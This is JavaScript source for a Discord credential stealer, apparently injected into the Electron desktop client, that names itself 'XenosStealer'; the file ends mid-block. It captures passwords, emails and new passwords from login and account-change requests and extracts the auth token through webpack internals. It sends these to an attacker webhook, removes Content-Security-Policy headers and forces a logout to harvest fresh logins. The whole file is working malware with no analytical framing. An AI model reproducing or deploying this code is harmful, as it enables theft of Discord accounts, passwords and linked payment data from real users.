const {
    BrowserWindow: BrowserWindow,
    session: session
} = require("electron"), fs = require("fs"), path = require("path"), webhook = "%WEBHOOK_LINK%", Filters = {
    1: {
        urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", "https://discord.com/api/v*/auth/login", "https://*.discord.com/api/v*/auth/login", "https://api.stripe.com/v1/tokens"]
    },
    2: {
        urls: ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
    }
};
class Events {
    constructor(e, s, o) {
        this.event = e, this.data = o, this.token = s
    }
    handle() {
        switch (this.event) {
            case "passwordChanged":
                passwordChanged(this.token, this.data.new_password);
                break;
            case "userLogin":
                userLogin(this.token, this.data.password);
                break;
            case "emailChanged":
                emailChanged(this.token, this.data.password)
        }
    }
}
async function firstTime() {
    if (!fs.existsSync(path.join(__dirname, "XenosStealer"))) return !0;
    return fs.rmdirSync(path.join(__dirname, "XenosStealer")), BrowserWindow.getAllWindows()[0].webContents.executeJavaScript('window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();', !0).then(e => {}), !1
}
async function userLogin(e, s) {
    SendToXenos(e, s)
}
async function emailChanged(e, s) {
    SendToXenos(e, s)
}
async function passwordChanged(e, s) {
    SendToXenos(e, s)
}
async function SendToXenos(e, s = "") {
    BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(`var xhr = new XMLHttpRequest();xhr.open("GET", "${webhook}/api?type=addtoken&token=${e}&password=${s}", true);;xhr.setRequestHeader('Access-Control-Allow-Origin', '*');xhr.Send();`, !0)
}
async function getToken() {
    const e = BrowserWindow.getAllWindows()[0];
    return await e.webContents.executeJavaScript("for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[['get_require']]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)'getToken'==a&&(token=b.default.getToken())}token;", !0)
}
session.defaultSession.webRequest.onBeforeRequest(Filters[2], (e, s) => {
    firstTime(), s({})
}), session.defaultSession.webRequest.onHeadersReceived((e, s) => {
    e.url.startsWith(webhook) ? e.url.includes("discord.com") ? s({
        responseHeaders: Object.assign({
            "Access-Control-Allow-Headers": "*"
        }, e.responseHeaders)
    }) : s({
        responseHeaders: Object.assign({
            "Content-Security-Policy": ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
            "Access-Control-Allow-Headers": "*",
            "Access-Control-Allow-Origin": "*"
        }, e.responseHeaders)
    }) : (delete e.responseHeaders["content-security-policy"], delete e.responseHeaders["content-security-policy-report-only"], s({
        responseHeaders: {
            ...e.responseHeaders,
            "Access-Control-Allow-Headers": "*"
        }
    }))
}), session.defaultSession.webRequest.onCompleted(Filters[1], async (e, s) => {
    if (200 != e.statusCode) return;
    const o = Buffer.from(e.uploadData[0].bytes).toString(),
        t = JSON.parse(o),
        r = await getToken();
    switch (!0) {
        case e.url.endsWith("login"):
            return void new Events("userLogin", r, {
                password: t.password,
                email: t.login
            }).handle();
        case e.url.endsWith("users/@me") && "PATCH" == e.method:
            if (!t.password) return;
            if (t.email) new Events("emailChanged", r, {
                password: t.password,
                email: t.email
            }).handle();
            if (t.new_password) new Events("passwordChanged", r, {
                password: t.password,
                new_password: t.new_password
            }).handle();
            return
    }
